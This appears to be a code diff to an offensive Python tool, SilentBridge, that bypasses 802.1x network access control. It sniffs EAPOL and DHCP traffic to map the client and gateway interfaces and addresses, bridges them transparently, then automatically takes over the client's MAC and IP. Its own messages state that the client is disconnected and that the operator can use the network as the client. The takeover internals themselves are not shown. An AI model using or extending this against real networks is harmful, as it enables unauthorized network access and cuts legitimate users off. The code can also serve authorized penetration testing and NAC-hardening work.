@@ -709,7 +709,24 @@ class SilentBridge:
         self.packet_queue.put(packet)
 
     def analyze_packets(self, timeout):
-        """Analyze collected packets to determine network configuration"""
+        """Analyze collected packets to determine network configuration
+        
+        This method analyzes packets to determine:
+        1. Which interface is connected to the client (phy_interface)
+        2. Which interface is connected to the network/upstream (upstream_interface)
+        3. Client MAC and IP addresses
+        4. Router/Gateway MAC and IP addresses
+        
+        The analysis works differently depending on whether the bridge is created or not:
+        
+        Before bridge creation:
+        - Client side (phy) indicators: EAPOL Start messages, DHCP Requests
+        - Network side (upstream) indicators: EAP Request Identity packets
+        
+        After bridge creation:
+        - Client side (phy) indicators: EAPOL Start messages, DHCP Requests
+        - Network side (upstream) indicators: EAP Request Identity, DHCP Offers
+        """
         end_time = time.time() + timeout
         config = {
             'phy_interface': None,
@@ -720,55 +737,128 @@ class SilentBridge:
             'router_ip': None
         }
         
-        eap_interfaces = set()
-        dhcp_interfaces = set()
-        dhcp_transactions = {}
+        # Track interfaces where specific packets are seen
+        client_side_interfaces = set()  # Interfaces where client packets are seen
+        network_side_interfaces = set()  # Interfaces where network packets are seen
+        dhcp_transactions = {}  # Track DHCP transactions
+        
+        # Check if bridge exists (to determine analysis mode)
+        bridge_exists = False
+        if hasattr(self.args, 'bridge') and self.check_interface_exists(self.args.bridge):
+            bridge_exists = True
+            print("[*] Bridge exists, analyzing traffic through bridge...")
+        else:
+            print("[*] No bridge detected, analyzing direct interface traffic...")
         
         while time.time() < end_time:
             try:
                 packet = self.packet_queue.get(timeout=1)
                 
-                # Check for EAP packets
+                # Extract interface and MAC addresses
+                interface = packet.sniffed_on
+                src_mac = packet[Ether].src
+                dst_mac = packet[Ether].dst
+                
+                # Check for EAPOL packets
                 if EAPOL in packet:
-                    eap_interfaces.add(packet.sniffed_on)
-                    if packet[EAPOL].type == 1:  # EAPOL-Start
-                        config['client_mac'] = packet[Ether].src
+                    if packet[EAPOL].type == 1:  # EAPOL-Start (from client)
+                        client_side_interfaces.add(interface)
+                        config['client_mac'] = src_mac
+                        print(f"[*] Detected EAPOL-Start from {src_mac} on {interface} (client side)")
+                    
+                    # Check for EAP packets within EAPOL
+                    if packet.haslayer('EAP'):
+                        if packet['EAP'].code == 1:  # EAP Request
+                            if packet['EAP'].type == 1:  # Identity Request (from network)
+                                network_side_interfaces.add(interface)
+                                config['router_mac'] = src_mac
+                                print(f"[*] Detected EAP Identity Request from {src_mac} on {interface} (network side)")
                 
                 # Check for DHCP packets
                 if DHCP in packet:
-                    dhcp_interfaces.add(packet.sniffed_on)
+                    message_type = None
+                    for opt in packet[DHCP].options:
+                        if isinstance(opt, tuple) and opt[0] == 'message-type':
+                            message_type = opt[1]
+                            break
                     
-                    if packet[BOOTP].op == 1:  # DHCP Request
+                    if message_type == 1:  # DHCP Discover (from client)
+                        client_side_interfaces.add(interface)
+                        print(f"[*] Detected DHCP Discover from {src_mac} on {interface} (client side)")
+                    
+                    elif message_type == 3:  # DHCP Request (from client)
+                        client_side_interfaces.add(interface)
+                        config['client_mac'] = src_mac
+                        print(f"[*] Detected DHCP Request from {src_mac} on {interface} (client side)")
+                        
+                        # Track DHCP transaction
                         transaction_id = packet[BOOTP].xid
                         dhcp_transactions[transaction_id] = {
-                            'client_mac': packet[Ether].src,
-                            'interface': packet.sniffed_on
+                            'client_mac': src_mac,
+                            'interface': interface
                         }
                     
-                    elif packet[BOOTP].op == 2:  # DHCP Reply
+                    elif message_type == 2:  # DHCP Offer (from network)
+                        network_side_interfaces.add(interface)
+                        config['router_mac'] = src_mac
+                        print(f"[*] Detected DHCP Offer from {src_mac} on {interface} (network side)")
+                    
+                    elif message_type == 5:  # DHCP ACK (from network)
+                        network_side_interfaces.add(interface)
+                        config['router_mac'] = src_mac
+                        print(f"[*] Detected DHCP ACK from {src_mac} on {interface} (network side)")
+                        
+                        # Complete DHCP transaction
                         transaction_id = packet[BOOTP].xid
                         if transaction_id in dhcp_transactions:
                             config['client_mac'] = dhcp_transactions[transaction_id]['client_mac']
                             config['client_ip'] = packet[BOOTP].yiaddr
                             config['router_ip'] = packet[BOOTP].siaddr
-                            config['router_mac'] = packet[Ether].src
                             config['phy_interface'] = dhcp_transactions[transaction_id]['interface']
-                            config['upstream_interface'] = packet.sniffed_on
+                            config['upstream_interface'] = interface
+                            print(f"[*] Completed DHCP transaction: Client IP {config['client_ip']}, Router IP {config['router_ip']}")
                 
-            except Exception:
+            except Exception as e:
+                print(f"[!] Error processing packet: {e}")
                 continue
             
             # If we have all the information we need, we can stop early
-            if all(v is not None for v in config.values()):
+            if all(v is not None for v in [config['client_mac'], config['client_ip'], 
+                                          config['router_mac'], config['router_ip'],
+                                          config['phy_interface'], config['upstream_interface']]):
+                print("[+] All network information collected, stopping analysis early")
                 break
         
-        # If we couldn't determine interfaces from DHCP, try to use EAP
-        if config['phy_interface'] is None and len(eap_interfaces) == 1:
-            config['phy_interface'] = list(eap_interfaces)[0]
-            # Assume the other interface is upstream
-            other_interfaces = set(self.args.interfaces) - {config['phy_interface']}
-            if len(other_interfaces) == 1:
-                config['upstream_interface'] = list(other_interfaces)[0]
+        # If we couldn't determine interfaces from complete DHCP transactions,
+        # use the client and network side interface sets
+        if config['phy_interface'] is None and client_side_interfaces:
+            if len(client_side_interfaces) == 1:
+                config['phy_interface'] = list(client_side_interfaces)[0]
+                print(f"[*] Determined client interface (phy): {config['phy_interface']}")
+        
+        if config['upstream_interface'] is None and network_side_interfaces:
+            if len(network_side_interfaces) == 1:
+                config['upstream_interface'] = list(network_side_interfaces)[0]
+                print(f"[*] Determined network interface (upstream): {config['upstream_interface']}")
+        
+        # If we have client interface but not upstream, and we have exactly two interfaces,
+        # assume the other one is upstream
+        if config['phy_interface'] is not None and config['upstream_interface'] is None:
+            available_interfaces = set(self.args.interfaces)
+            if len(available_interfaces) == 2:
+                other_interfaces = available_interfaces - {config['phy_interface']}
+                if len(other_interfaces) == 1:
+                    config['upstream_interface'] = list(other_interfaces)[0]
+                    print(f"[*] Inferred network interface (upstream): {config['upstream_interface']}")
+        
+        # Similarly, if we have upstream but not client interface
+        if config['upstream_interface'] is not None and config['phy_interface'] is None:
+            available_interfaces = set(self.args.interfaces)
+            if len(available_interfaces) == 2:
+                other_interfaces = available_interfaces - {config['upstream_interface']}
+                if len(other_interfaces) == 1:
+                    config['phy_interface'] = list(other_interfaces)[0]
+                    print(f"[*] Inferred client interface (phy): {config['phy_interface']}")
         
         return config
 
@@ -782,10 +872,19 @@ class SilentBridge:
                 print(f"[!] Interface {iface} does not exist!")
                 return
         
+        print("[*] Interfaces to analyze:")
+        for iface in self.args.interfaces:
+            try:
+                mac = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']
+                print(f"  - {iface} (MAC: {mac})")
+            except:
+                print(f"  - {iface} (MAC: unknown)")
+        
         # Start packet capture on all interfaces
+        print("[*] Starting packet capture on all interfaces...")
         threads = []
         for iface in self.args.interfaces:
-            thread = Thread(target=lambda: sniff(
+            thread = Thread(target=lambda iface=iface: sniff(
                 iface=iface,
                 prn=self.packet_callback,
                 store=0,
@@ -795,7 +894,12 @@ class SilentBridge:
             thread.start()
             threads.append(thread)
         
-        print("[*] Listening for EAP and DHCP packets...")
+        print("[*] Listening for authentication and DHCP packets...")
+        print("[*] Looking for:")
+        print("  - EAPOL Start packets (from client)")
+        print("  - EAP Identity Request packets (from network)")
+        print("  - DHCP Discover/Request packets (from client)")
+        print("  - DHCP Offer/ACK packets (from network)")
         print(f"[*] Analysis will timeout in {self.args.timeout} seconds")
         print("[*] Please initiate 802.1x authentication or DHCP request on the client...")
         
@@ -809,45 +913,63 @@ class SilentBridge:
         
         # Print results
         print("\n[+] Analysis complete!")
-        print("\nDetected Configuration:")
-        print("-----------------------")
-        if config['phy_interface']:
-            print(f"Client Interface (phy): {config['phy_interface']}")
-        else:
-            print("[!] Could not determine client interface")
+        print("\nDetected Network Configuration:")
+        print("------------------------------")
         
-        if config['upstream_interface']:
-            print(f"Upstream Interface: {config['upstream_interface']}")
+        # Client side information
+        print("\nClient Side:")
+        if config['phy_interface']:
+            print(f"  Interface: {config['phy_interface']}")
         else:
-            print("[!] Could not determine upstream interface")
+            print("  Interface: [!] Could not determine client interface")
         
         if config['client_mac']:
-            print(f"Client MAC Address: {config['client_mac']}")
+            print(f"  MAC Address: {config['client_mac']}")
         else:
-            print("[!] Could not determine client MAC address")
+            print("  MAC Address: [!] Could not determine client MAC address")
         
         if config['client_ip']:
-            print(f"Client IP Address: {config['client_ip']}")
+            print(f"  IP Address: {config['client_ip']}")
         else:
-            print("[!] Could not determine client IP address")
+            print("  IP Address: [!] Could not determine client IP address")
+        
+        # Network side information
+        print("\nNetwork Side:")
+        if config['upstream_interface']:
+            print(f"  Interface: {config['upstream_interface']}")
+        else:
+            print("  Interface: [!] Could not determine upstream interface")
         
         if config['router_mac']:
-            print(f"Router MAC Address: {config['router_mac']}")
+            print(f"  Gateway MAC: {config['router_mac']}")
         else:
-            print("[!] Could not determine router MAC address")
+            print("  Gateway MAC: [!] Could not determine gateway MAC address")
         
         if config['router_ip']:
-            print(f"Router IP Address: {config['router_ip']}")
+            print(f"  Gateway IP: {config['router_ip']}")
         else:
-            print("[!] Could not determine router IP address")
+            print("  Gateway IP: [!] Could not determine gateway IP address")
+        
+        # Provide recommendations based on analysis results
+        print("\nRecommendations:")
+        if config['phy_interface'] and config['upstream_interface']:
+            print(f"[+] Create a bridge with: --phy {config['phy_interface']} --upstream {config['upstream_interface']}")
+        else:
+            if not config['phy_interface']:
+                print("[!] Could not determine client interface. Try manually specifying --phy.")
+            if not config['upstream_interface']:
+                print("[!] Could not determine upstream interface. Try manually specifying --upstream.")
         
         # Save configuration
         if any(v is not None for v in config.values()):
             print("\n[*] Saving configuration...")
             self.save_config(config)
             print(f"[+] Configuration saved to {self.config_file}")
+            print("[*] You can use this configuration with --use-stored-config")
         else:
             print("\n[!] No configuration detected to save")
+        
+        return config
 
     def check_network_stack(self):
         """Detect available networking tools and stack"""
@@ -957,8 +1079,9 @@ class SilentBridge:
                     return
             
             # Step 1: Reset interfaces to clean state
-            print("[*] Resetting interfaces to clean state...")
+            print("[*] Step 1: Resetting interfaces to clean state...")
             for iface in self.args.interfaces:
+                print(f"[*] Resetting {iface}...")
                 if not self.reset_interface(iface):
                     raise Exception(f"Failed to reset interface {iface}")
             
@@ -978,7 +1101,7 @@ class SilentBridge:
                     time.sleep(1)
             
             # Step 2: Analyze network to determine interfaces
-            print("[*] Starting network analysis...")
+            print("[*] Step 2: Analyzing network to determine interface roles...")
             # Create temporary args for analysis
             original_args = self.args
             analysis_args = argparse.Namespace(
@@ -1015,9 +1138,9 @@ class SilentBridge:
                 thread.start()
                 threads.append(thread)
             
-            print("[*] Listening for EAP and DHCP packets...")
-            print(f"[*] Analysis will timeout in {self.args.timeout} seconds")
+            print("[*] Listening for authentication and DHCP packets...")
             print("[*] Please initiate 802.1x authentication or DHCP request on the client...")
+            print(f"[*] Analysis will timeout in {self.args.timeout} seconds")
             
             # Analyze packets
             config = self.analyze_packets(self.args.timeout)
@@ -1031,10 +1154,12 @@ class SilentBridge:
             self.args = original_args
             
             if not config['phy_interface'] or not config['upstream_interface']:
-                raise Exception("Could not determine interface roles")
+                raise Exception("Could not determine interface roles. Please try manual configuration.")
+            
+            print(f"[+] Analysis complete! Detected client interface: {config['phy_interface']}, network interface: {config['upstream_interface']}")
             
             # Step 3: Create bridge with analyzed interfaces
-            print("[*] Creating bridge with detected configuration...")
+            print("[*] Step 3: Creating bridge with detected configuration...")
             bridge_args = argparse.Namespace(
                 bridge=self.args.bridge,
                 phy=config['phy_interface'],
@@ -1045,25 +1170,43 @@ class SilentBridge:
             self.create_transparent_bridge()
             
             # Step 4: Wait for client authentication and DHCP
-            print("[*] Waiting for client authentication and DHCP...")
-            time.sleep(10)  # Give the bridge time to stabilize
+            print("[*] Step 4: Waiting for client authentication and DHCP...")
+            print("[*] Giving the bridge time to stabilize (10 seconds)...")
+            time.sleep(10)
             
             # Update config with client information
+            print("[*] Starting second packet capture to obtain client information...")
             self.args = analysis_args
             self.stop_sniffing.clear()
+            
+            # Clear any existing packets
+            while not self.packet_queue.empty():
+                self.packet_queue.get()
             
             # Start new packet capture for client info
             threads = []
             for iface in [config['phy_interface'], config['upstream_interface']]:
-                thread = Thread(target=lambda: sniff(
-                    iface=iface,
-                    prn=self.packet_callback,
-                    store=0,
-                    stop_filter=lambda _: self.stop_sniffing.is_set()
-                ))
+                def sniff_with_retry(iface):
+                    while not self.stop_sniffing.is_set():
+                        try:
+                            sniff(iface=iface,
+                                 prn=self.packet_callback,
+                                 store=0,
+                                 stop_filter=lambda _: self.stop_sniffing.is_set())
+                        except OSError as e:
+                            if e.errno == 100:  # Network is down
+                                print(f"[!] Interface {iface} is down, retrying...")
+                                time.sleep(1)
+                                continue
+                            raise
+                
+                thread = Thread(target=sniff_with_retry, args=(iface,))
                 thread.daemon = True
                 thread.start()
                 threads.append(thread)
+            
+            print("[*] Please initiate 802.1x authentication or DHCP request on the client again...")
+            print(f"[*] Analysis will timeout in {self.args.timeout} seconds")
             
             # Analyze packets for client information
             client_config = self.analyze_packets(self.args.timeout)
@@ -1073,36 +1216,49 @@ class SilentBridge:
             for thread in threads:
                 thread.join()
             
-            if not client_config['client_mac'] or not client_config['client_ip']:
-                raise Exception("Could not obtain client information")
+            # Merge configs, preferring the new client info
+            for key in ['client_mac', 'client_ip', 'router_mac', 'router_ip']:
+                if client_config[key] is not None:
+                    config[key] = client_config[key]
+            
+            if not config['client_mac'] or not config['client_ip']:
+                raise Exception("Could not obtain client information. Please try manual configuration.")
+            
+            print(f"[+] Client information obtained: MAC={config['client_mac']}, IP={config['client_ip']}")
             
             # Step 5: Perform takeover
-            print("[*] Initiating takeover with obtained configuration...")
+            print("[*] Step 5: Initiating takeover with obtained configuration...")
             takeover_args = argparse.Namespace(
                 bridge=self.args.bridge,
                 phy=config['phy_interface'],
                 veth_name=self.args.veth_name,
-                client_mac=client_config['client_mac'],
-                client_ip=client_config['client_ip'],
+                client_mac=config['client_mac'],
+                client_ip=config['client_ip'],
                 netmask='255.255.255.0',  # Default netmask
-                gateway_ip=client_config['router_ip'] if client_config['router_ip'] else None
+                gateway_ip=config['router_ip'] if config['router_ip'] else None
             )
             
             if not takeover_args.gateway_ip:
                 # Try to determine gateway from client IP
-                ip_parts = client_config['client_ip'].split('.')
+                print("[*] Gateway IP not detected, inferring from client IP...")
+                ip_parts = config['client_ip'].split('.')
                 ip_parts[3] = '1'
                 takeover_args.gateway_ip = '.'.join(ip_parts)
+                print(f"[*] Using inferred gateway IP: {takeover_args.gateway_ip}")
             
             self.args = takeover_args
             self.takeover_client()
             
             success = True
             print("[+] Autotakeover completed successfully!")
+            print(f"[+] The system is now using {self.args.veth_name} with client's MAC and IP.")
+            print(f"[+] The client has been disconnected from the network.")
+            print("[*] You can now use the network as the client.")
             
         except Exception as e:
             print(f"[!] Error during autotakeover: {e}")
             if not success:
+                print("[*] Cleaning up and restoring original state...")
                 self.cleanup_autotakeover()
                 print("[*] System restored to original state")
         
